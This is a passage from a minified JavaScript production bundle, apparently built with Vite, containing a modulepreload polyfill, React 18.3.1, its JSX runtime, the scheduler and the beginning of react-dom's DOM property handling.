function GN(e,t){for(var n=0;n<t.length;n++){const r=t[n];if(typeof r!="string"&&!Array.isArray(r)){for(const a in r)if(a!=="default"&&!(a in e)){const l=Object.getOwnPropertyDescriptor(r,a);l&&Object.defineProperty(e,a,l.get?l:{enumerable:!0,get:()=>r[a]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const a of document.querySelectorAll('link[rel="modulepreload"]'))r(a);new MutationObserver(a=>{for(const l of a)if(l.type==="childList")for(const u of l.addedNodes)u.tagName==="LINK"&&u.rel==="modulepreload"&&r(u)}).observe(document,{childList:!0,subtree:!0});function n(a){const l={};return a.integrity&&(l.integrity=a.integrity),a.referrerPolicy&&(l.referrerPolicy=a.referrerPolicy),a.crossOrigin==="use-credentials"?l.credentials="include":a.crossOrigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function r(a){if(a.ep)return;a.ep=!0;const l=n(a);fetch(a.href,l)}})();var du=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function bf(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function QN(e){if(e.__esModule)return e;var t=e.default;if(typeof t=="function"){var n=function r(){return this instanceof r?Reflect.construct(t,arguments,this.constructor):t.apply(this,arguments)};n.prototype=t.prototype}else n={};return Object.defineProperty(n,"__esModule",{value:!0}),Object.keys(e).forEach(function(r){var a=Object.getOwnPropertyDescriptor(e,r);Object.defineProperty(n,r,a.get?a:{enumerable:!0,get:function(){return e[r]}})}),n}var A2={exports:{}},Ef={},D2={exports:{}},dt={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Uu=Symbol.for("react.element"),KN=Symbol.for("react.portal"),XN=Symbol.for("react.fragment"),ZN=Symbol.for("react.strict_mode"),JN=Symbol.for("react.profiler"),eA=Symbol.for("react.provider"),tA=Symbol.for("react.context"),nA=Symbol.for("react.forward_ref"),rA=Symbol.for("react.suspense"),iA=Symbol.for("react.memo"),aA=Symbol.for("react.lazy"),Dy=Symbol.iterator;function sA(e){return e===null||typeof e!="object"?null:(e=Dy&&e[Dy]||e["@@iterator"],typeof e=="function"?e:null)}var L2={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},_2=Object.assign,I2={};function Il(e,t,n){this.props=e,this.context=t,this.refs=I2,this.updater=n||L2}Il.prototype.isReactComponent={};Il.prototype.setState=function(e,t){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")};Il.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function P2(){}P2.prototype=Il.prototype;function z0(e,t,n){this.props=e,this.context=t,this.refs=I2,this.updater=n||L2}var W0=z0.prototype=new P2;W0.constructor=z0;_2(W0,Il.prototype);W0.isPureReactComponent=!0;var Ly=Array.isArray,j2=Object.prototype.hasOwnProperty,q0={current:null},R2={key:!0,ref:!0,__self:!0,__source:!0};function O2(e,t,n){var r,a={},l=null,u=null;if(t!=null)for(r in t.ref!==void 0&&(u=t.ref),t.key!==void 0&&(l=""+t.key),t)j2.call(t,r)&&!R2.hasOwnProperty(r)&&(a[r]=t[r]);var f=arguments.length-2;if(f===1)a.children=n;else if(1<f){for(var h=Array(f),m=0;m<f;m++)h[m]=arguments[m+2];a.children=h}if(e&&e.defaultProps)for(r in f=e.defaultProps,f)a[r]===void 0&&(a[r]=f[r]);return{$$typeof:Uu,type:e,key:l,ref:u,props:a,_owner:q0.current}}function lA(e,t){return{$$typeof:Uu,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function $0(e){return typeof e=="object"&&e!==null&&e.$$typeof===Uu}function oA(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(n){return t[n]})}var _y=/\/+/g;function Tp(e,t){return typeof e=="object"&&e!==null&&e.key!=null?oA(""+e.key):t.toString(36)}function md(e,t,n,r,a){var l=typeof e;(l==="undefined"||l==="boolean")&&(e=null);var u=!1;if(e===null)u=!0;else switch(l){case"string":case"number":u=!0;break;case"object":switch(e.$$typeof){case Uu:case KN:u=!0}}if(u)return u=e,a=a(u),e=r===""?"."+Tp(u,0):r,Ly(a)?(n="",e!=null&&(n=e.replace(_y,"$&/")+"/"),md(a,t,n,"",function(m){return m})):a!=null&&($0(a)&&(a=lA(a,n+(!a.key||u&&u.key===a.key?"":(""+a.key).replace(_y,"$&/")+"/")+e)),t.push(a)),1;if(u=0,r=r===""?".":r+":",Ly(e))for(var f=0;f<e.length;f++){l=e[f];var h=r+Tp(l,f);u+=md(l,t,n,h,a)}else if(h=sA(e),typeof h=="function")for(e=h.call(e),f=0;!(l=e.next()).done;)l=l.value,h=r+Tp(l,f++),u+=md(l,t,n,h,a);else if(l==="object")throw t=String(e),Error("Objects are not valid as a React child (found: "+(t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return u}function zc(e,t,n){if(e==null)return e;var r=[],a=0;return md(e,r,"","",function(l){return t.call(n,l,a++)}),r}function uA(e){if(e._status===-1){var t=e._result;t=t(),t.then(function(n){(e._status===0||e._status===-1)&&(e._status=1,e._result=n)},function(n){(e._status===0||e._status===-1)&&(e._status=2,e._result=n)}),e._status===-1&&(e._status=0,e._result=t)}if(e._status===1)return e._result.default;throw e._result}var Jn={current:null},gd={transition:null},cA={ReactCurrentDispatcher:Jn,ReactCurrentBatchConfig:gd,ReactCurrentOwner:q0};function F2(){throw Error("act(...) is not supported in production builds of React.")}dt.Children={map:zc,forEach:function(e,t,n){zc(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return zc(e,function(){t++}),t},toArray:function(e){return zc(e,function(t){return t})||[]},only:function(e){if(!$0(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};dt.Component=Il;dt.Fragment=XN;dt.Profiler=JN;dt.PureComponent=z0;dt.StrictMode=ZN;dt.Suspense=rA;dt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=cA;dt.act=F2;dt.cloneElement=function(e,t,n){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var r=_2({},e.props),a=e.key,l=e.ref,u=e._owner;if(t!=null){if(t.ref!==void 0&&(l=t.ref,u=q0.current),t.key!==void 0&&(a=""+t.key),e.type&&e.type.defaultProps)var f=e.type.defaultProps;for(h in t)j2.call(t,h)&&!R2.hasOwnProperty(h)&&(r[h]=t[h]===void 0&&f!==void 0?f[h]:t[h])}var h=arguments.length-2;if(h===1)r.children=n;else if(1<h){f=Array(h);for(var m=0;m<h;m++)f[m]=arguments[m+2];r.children=f}return{$$typeof:Uu,type:e.type,key:a,ref:l,props:r,_owner:u}};dt.createContext=function(e){return e={$$typeof:tA,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:eA,_context:e},e.Consumer=e};dt.createElement=O2;dt.createFactory=function(e){var t=O2.bind(null,e);return t.type=e,t};dt.createRef=function(){return{current:null}};dt.forwardRef=function(e){return{$$typeof:nA,render:e}};dt.isValidElement=$0;dt.lazy=function(e){return{$$typeof:aA,_payload:{_status:-1,_result:e},_init:uA}};dt.memo=function(e,t){return{$$typeof:iA,type:e,compare:t===void 0?null:t}};dt.startTransition=function(e){var t=gd.transition;gd.transition={};try{e()}finally{gd.transition=t}};dt.unstable_act=F2;dt.useCallback=function(e,t){return Jn.current.useCallback(e,t)};dt.useContext=function(e){return Jn.current.useContext(e)};dt.useDebugValue=function(){};dt.useDeferredValue=function(e){return Jn.current.useDeferredValue(e)};dt.useEffect=function(e,t){return Jn.current.useEffect(e,t)};dt.useId=function(){return Jn.current.useId()};dt.useImperativeHandle=function(e,t,n){return Jn.current.useImperativeHandle(e,t,n)};dt.useInsertionEffect=function(e,t){return Jn.current.useInsertionEffect(e,t)};dt.useLayoutEffect=function(e,t){return Jn.current.useLayoutEffect(e,t)};dt.useMemo=function(e,t){return Jn.current.useMemo(e,t)};dt.useReducer=function(e,t,n){return Jn.current.useReducer(e,t,n)};dt.useRef=function(e){return Jn.current.useRef(e)};dt.useState=function(e){return Jn.current.useState(e)};dt.useSyncExternalStore=function(e,t,n){return Jn.current.useSyncExternalStore(e,t,n)};dt.useTransition=function(){return Jn.current.useTransition()};dt.version="18.3.1";D2.exports=dt;var j=D2.exports;const Vo=bf(j),dA=GN({__proto__:null,default:Vo},[j]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var fA=j,hA=Symbol.for("react.element"),pA=Symbol.for("react.fragment"),mA=Object.prototype.hasOwnProperty,gA=fA.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,xA={key:!0,ref:!0,__self:!0,__source:!0};function M2(e,t,n){var r,a={},l=null,u=null;n!==void 0&&(l=""+n),t.key!==void 0&&(l=""+t.key),t.ref!==void 0&&(u=t.ref);for(r in t)mA.call(t,r)&&!xA.hasOwnProperty(r)&&(a[r]=t[r]);if(e&&e.defaultProps)for(r in t=e.defaultProps,t)a[r]===void 0&&(a[r]=t[r]);return{$$typeof:hA,type:e,key:l,ref:u,props:a,_owner:gA.current}}Ef.Fragment=pA;Ef.jsx=M2;Ef.jsxs=M2;A2.exports=Ef;var o=A2.exports,bm={},B2={exports:{}},Er={},H2={exports:{}},U2={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function t(ae,xe){var q=ae.length;ae.push(xe);e:for(;0<q;){var We=q-1>>>1,Q=ae[We];if(0<a(Q,xe))ae[We]=xe,ae[q]=Q,q=We;else break e}}function n(ae){return ae.length===0?null:ae[0]}function r(ae){if(ae.length===0)return null;var xe=ae[0],q=ae.pop();if(q!==xe){ae[0]=q;e:for(var We=0,Q=ae.length,k=Q>>>1;We<k;){var se=2*(We+1)-1,Ve=ae[se],De=se+1,Ke=ae[De];if(0>a(Ve,q))De<Q&&0>a(Ke,Ve)?(ae[We]=Ke,ae[De]=q,We=De):(ae[We]=Ve,ae[se]=q,We=se);else if(De<Q&&0>a(Ke,q))ae[We]=Ke,ae[De]=q,We=De;else break e}}return xe}function a(ae,xe){var q=ae.sortIndex-xe.sortIndex;return q!==0?q:ae.id-xe.id}if(typeof performance=="object"&&typeof performance.now=="function"){var l=performance;e.unstable_now=function(){return l.now()}}else{var u=Date,f=u.now();e.unstable_now=function(){return u.now()-f}}var h=[],m=[],x=1,g=null,b=3,E=!1,C=!1,P=!1,O=typeof setTimeout=="function"?setTimeout:null,N=typeof clearTimeout=="function"?clearTimeout:null,T=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function A(ae){for(var xe=n(m);xe!==null;){if(xe.callback===null)r(m);else if(xe.startTime<=ae)r(m),xe.sortIndex=xe.expirationTime,t(h,xe);else break;xe=n(m)}}function _(ae){if(P=!1,A(ae),!C)if(n(h)!==null)C=!0,pe(M);else{var xe=n(m);xe!==null&&oe(_,xe.startTime-ae)}}function M(ae,xe){C=!1,P&&(P=!1,N(U),U=-1),E=!0;var q=b;try{for(A(xe),g=n(h);g!==null&&(!(g.expirationTime>xe)||ae&&!ne());){var We=g.callback;if(typeof We=="function"){g.callback=null,b=g.priorityLevel;var Q=We(g.expirationTime<=xe);xe=e.unstable_now(),typeof Q=="function"?g.callback=Q:g===n(h)&&r(h),A(xe)}else r(h);g=n(h)}if(g!==null)var k=!0;else{var se=n(m);se!==null&&oe(_,se.startTime-xe),k=!1}return k}finally{g=null,b=q,E=!1}}var R=!1,B=null,U=-1,$=5,Y=-1;function ne(){return!(e.unstable_now()-Y<$)}function Z(){if(B!==null){var ae=e.unstable_now();Y=ae;var xe=!0;try{xe=B(!0,ae)}finally{xe?me():(R=!1,B=null)}}else R=!1}var me;if(typeof T=="function")me=function(){T(Z)};else if(typeof MessageChannel<"u"){var ye=new MessageChannel,J=ye.port2;ye.port1.onmessage=Z,me=function(){J.postMessage(null)}}else me=function(){O(Z,0)};function pe(ae){B=ae,R||(R=!0,me())}function oe(ae,xe){U=O(function(){ae(e.unstable_now())},xe)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(ae){ae.callback=null},e.unstable_continueExecution=function(){C||E||(C=!0,pe(M))},e.unstable_forceFrameRate=function(ae){0>ae||125<ae?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):$=0<ae?Math.floor(1e3/ae):5},e.unstable_getCurrentPriorityLevel=function(){return b},e.unstable_getFirstCallbackNode=function(){return n(h)},e.unstable_next=function(ae){switch(b){case 1:case 2:case 3:var xe=3;break;default:xe=b}var q=b;b=xe;try{return ae()}finally{b=q}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(ae,xe){switch(ae){case 1:case 2:case 3:case 4:case 5:break;default:ae=3}var q=b;b=ae;try{return xe()}finally{b=q}},e.unstable_scheduleCallback=function(ae,xe,q){var We=e.unstable_now();switch(typeof q=="object"&&q!==null?(q=q.delay,q=typeof q=="number"&&0<q?We+q:We):q=We,ae){case 1:var Q=-1;break;case 2:Q=250;break;case 5:Q=1073741823;break;case 4:Q=1e4;break;default:Q=5e3}return Q=q+Q,ae={id:x++,callback:xe,priorityLevel:ae,startTime:q,expirationTime:Q,sortIndex:-1},q>We?(ae.sortIndex=q,t(m,ae),n(h)===null&&ae===n(m)&&(P?(N(U),U=-1):P=!0,oe(_,q-We))):(ae.sortIndex=Q,t(h,ae),C||E||(C=!0,pe(M))),ae},e.unstable_shouldYield=ne,e.unstable_wrapCallback=function(ae){var xe=b;return function(){var q=b;b=xe;try{return ae.apply(this,arguments)}finally{b=q}}}})(U2);H2.exports=U2;var yA=H2.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var vA=j,br=yA;function Se(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var z2=new Set,fu={};function ys(e,t){bl(e,t),bl(e+"Capture",t)}function bl(e,t){for(fu[e]=t,e=0;e<t.length;e++)z2.add(t[e])}var _i=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Em=Object.prototype.hasOwnProperty,bA=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Iy={},Py={};function EA(e){return Em.call(Py,e)?!0:Em.call(Iy,e)?!1:bA.test(e)?Py[e]=!0:(Iy[e]=!0,!1)}function wA(e,t,n,r){if(n!==null&&n.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function kA(e,t,n,r){if(t===null||typeof t>"u"||wA(e,t,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function er(e,t,n,r,a,l,u){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=r,this.attributeNamespace=a,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=l,this.removeEmptyString=u}var Dn={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){Dn[e]=new er(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];Dn[t]=new er(t,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){Dn[e]=new er(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){Dn[e]=new er(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){Dn[e]=new er(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){Dn[e]=new er(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){Dn[e]=new er(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){Dn[e]=new er(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){Dn[e]=new er(e,5,!1,e.toLowerCase(),null,!1,!1)});var Y0=/[\-:]([a-z])/g;function V0(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(Y0,V0);Dn[t]=new er(t,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(Y0,V0);Dn[t]=new er(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(Y0,V0);Dn[t]=new er(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){Dn[e]=new er(e,1,!1,e.toLowerCase(),null,!1,!1)});Dn.xlinkHref=new er("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){Dn[e]=new er(e,1,!1,e.toLowerCase(),null,!0,!0)});function G0(e,t,n,r){var a=Dn.hasOwnProperty(t)?Dn[t]:null;(a!==null?a.type!==0:r||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(kA(t,n,a,r)&&(n=null),r||a===null?EA(t)&&(n===null?e.removeAttribute(t):e.setAttribute(t,""+n)):a.mustUseProperty?e[a.propertyName]=n===null?a.type===3?!1:"":n:(t=a.attributeName,r=a.attributeNamespace,n===null?e.removeAttribute(t):(a=a.type,n=a===3||a===4&&n===!0?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}var Hi=vA.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Wc=Symbol.for("react.element"),Ks=Symbol.for("react.portal"),Xs=Symbol.for("react.fragment"),Q0=Symbol.for("react.strict_mode"),wm=Symbol.for("react.profiler"),W2=Symbol.for("react.provider"),q2=Symbol.for("react.context"),K0=Symbol.for("react.forward_ref"),km=Symbol.for("react.suspense"),Tm=Symbol.for("react.suspense_list"),X0=Symbol.for("react.memo"),ua=Symbol.for("react.lazy"),$2=Symbol.for("react.offscreen"),jy=Symbol.iterator;function To(e){return e===null||typeof e!="object"?null:(e=jy&&e[jy]||e["@@iterator"],typeof e=="function"?e:null)}var Vt=Object.assign,Cp;function zo(e){if(Cp===void 0)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);Cp=t&&t[1]||""}return`
`+Cp+e}var Sp=!1;function Np(e,t){if(!e||Sp)return"";Sp=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(m){var r=m}Reflect.construct(e,[],t)}else{try{t.call()}catch(m){r=m}e.call(t.prototype)}else{try{throw Error()}catch(m){r=m}e()}}catch(m){if(m&&r&&typeof m.stack=="string"){for(var a=m.stack.split(`
`),l=r.stack.split(`
`),u=a.length-1,f=l.length-1;1<=u&&0<=f&&a[u]!==l[f];)f--;for(;1<=u&&0<=f;u--,f--)if(a[u]!==l[f]){if(u!==1||f!==1)do if(u--,f--,0>f||a[u]!==l[f]){var h=`
`+a[u].replace(" at new "," at ");return e.displayName&&h.includes("<anonymous>")&&(h=h.replace("<anonymous>",e.displayName)),h}while(1<=u&&0<=f);break}}}finally{Sp=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?zo(e):""}function TA(e){switch(e.tag){case 5:return zo(e.type);case 16:return zo("Lazy");case 13:return zo("Suspense");case 19:return zo("SuspenseList");case 0:case 2:case 15:return e=Np(e.type,!1),e;case 11:return e=Np(e.type.render,!1),e;case 1:return e=Np(e.type,!0),e;default:return""}}function Cm(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case Xs:return"Fragment";case Ks:return"Portal";case wm:return"Profiler";case Q0:return"StrictMode";case km:return"Suspense";case Tm:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case q2:return(e.displayName||"Context")+".Consumer";case W2:return(e._context.displayName||"Context")+".Provider";case K0:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case X0:return t=e.displayName||null,t!==null?t:Cm(e.type)||"Memo";case ua:t=e._payload,e=e._init;try{return Cm(e(t))}catch{}}return null}function CA(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return Cm(t);case 8:return t===Q0?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function Na(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Y2(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function SA(e){var t=Y2(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var a=n.get,l=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return a.call(this)},set:function(u){r=""+u,l.call(this,u)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(u){r=""+u},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function qc(e){e._valueTracker||(e._valueTracker=SA(e))}function V2(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=Y2(e)?e.checked?"true":"false":e.value),e=r,e!==n?(t.setValue(e),!0):!1}function Rd(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function Sm(e,t){var n=t.checked;return Vt({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??e._wrapperState.initialChecked})}function Ry(e,t){var n=t.defaultValue==null?"":t.defaultValue,r=t.checked!=null?t.checked:t.defaultChecked;n=Na(t.value!=null?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function G2(e,t){t=t.checked,t!=null&&G0(e,"checked",t,!1)}function Nm(e,t){G2(e,t);var n=Na(t.value),r=t.type;if(n!=null)r==="number"?(n===0&&e.value===""||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if(r==="submit"||r==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?Am(e,t.type,n):t.hasOwnProperty("defaultValue")&&Am(e,t.type,Na(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function Oy(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!(r!=="submit"&&r!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}n=e.name,n!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,n!==""&&(e.name=n)}function Am(e,t,n){(t!=="number"||Rd(e.ownerDocument)!==e)&&(n==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var Wo=Array.isArray;function ul(e,t,n,r){if(e=e.options,t){t={};for(var a=0;a<n.length;a++)t["$"+n[a]]=!0;for(n=0;n<e.length;n++)a=t.hasOwnProperty("$"+e[n].value),e[n].selected!==a&&(e[n].selected=a),a&&r&&(e[n].defaultSelected=!0)}else{for(n=""+Na(n),t=null,a=0;a<e.length;a++){if(e[a].value===n){e[a].selected=!0,r&&(e[a].defaultSelected=!0);return}t!==null||e[a].disabled||(t=e[a])}t!==null&&(t.selected=!0)}}function Dm(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(Se(91));return Vt({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Fy(e,t){var n=t.value;if(n==null){if(n=t.children,t=t.defaultValue,n!=null){if(t!=null)throw Error(Se(92));if(Wo(n)){if(1<n.length)throw Error(Se(93));n=n[0]}t=n}t==null&&(t=""),n=t}e._wrapperState={initialValue:Na(n)}}function Q2(e,t){var n=Na(t.value),r=Na(t.defaultValue);n!=null&&(n=""+n,n!==e.value&&(e.value=n),t.defaultValue==null&&e.defaultValue!==n&&(e.defaultValue=n)),r!=null&&(e.defaultValue=""+r)}function My(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function K2(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Lm(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?K2(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var $c,X2=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,n,r,a){MSApp.execUnsafeLocalFunction(function(){return e(t,n,r,a)})}:e}(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for($c=$c||document.createElement("div"),$c.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=$c.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function hu(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var 